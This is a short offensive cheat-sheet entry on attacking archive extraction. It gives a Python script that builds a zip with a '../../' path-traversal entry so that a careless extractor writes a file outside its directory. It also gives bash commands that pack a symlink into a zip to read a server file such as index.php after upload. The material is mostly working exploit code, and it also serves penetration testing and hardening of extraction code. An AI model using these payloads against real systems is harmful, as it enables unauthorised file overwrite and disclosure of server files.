ZIP
===

## Exploit Path Traversal on decompress

Some programs do not check the zip path while extracting the archive.
Then it's possible to exploit this to extract a file to a custom location.

```python
import os
import zipfile

def zip(dst):
  zf = zipfile.ZipFile('%s.zip' % dst, 'w', zipfile.ZIP_DEFLATED)
  zf.writestr('../../../../../../../tmp/test.txt', 'toto')

if __name__ == '__main__':
    zip('test')
```


## Symlink

Upload a link containing a symlink to an other file to access the remote file
after the decompression:

```bash
ln -s ../../../index.php test.txt
zip --symlinks test.zip test.txt
```
